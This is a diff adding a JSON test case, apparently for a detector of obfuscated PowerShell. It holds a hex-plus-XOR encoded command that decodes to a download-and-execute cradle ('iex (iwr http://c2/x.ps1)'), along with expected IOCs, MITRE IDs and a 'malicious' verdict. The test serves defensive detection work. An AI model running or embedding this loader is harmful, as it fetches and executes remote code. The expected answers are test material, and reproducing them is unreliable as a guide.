@@ -1,0 +1,46 @@
+{
+  "id": "hex-xor-multi-0",
+  "category": "ps-crypto",
+  "algorithm": "Hex+XOR-multi",
+  "command_line": "$h = '01000078471b4542125e1c110862405d51021d4e46150b6946'; $k = [Text.Encoding]::UTF8.GetBytes('hexXor2026'); $b = [byte[]]($h -split '(..)' | ?{$_} | %{[Convert]::ToByte($_,16)}); $out = -join(0..($b.Length-1) | %{[char]($b[$_] -bxor $k[$_ % $k.Length])}); IEX $out",
+  "stage_ladder": [
+    {
+      "name": "hex-decode",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "utf8-key",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "xor-multi-inline-key",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "utf8-decode",
+      "recoverable": true,
+      "reason": ""
+    }
+  ],
+  "key_status": "inline-static",
+  "expected_plaintext": "iex (iwr http://c2/x.ps1)",
+  "expected_iocs": [
+    "iex (iwr http://c2/x.ps1)"
+  ],
+  "expected_lolbins": [
+    "powershell.exe"
+  ],
+  "expected_mitre": [
+    "T1027",
+    "T1059.001",
+    "T1140"
+  ],
+  "expected_verdict": "malicious",
+  "expected_confidence_min": 0.85,
+  "notes": "",
+  "source": "nivxray-rc41-crypto",
+  "license": "CC-BY-4.0"
+}
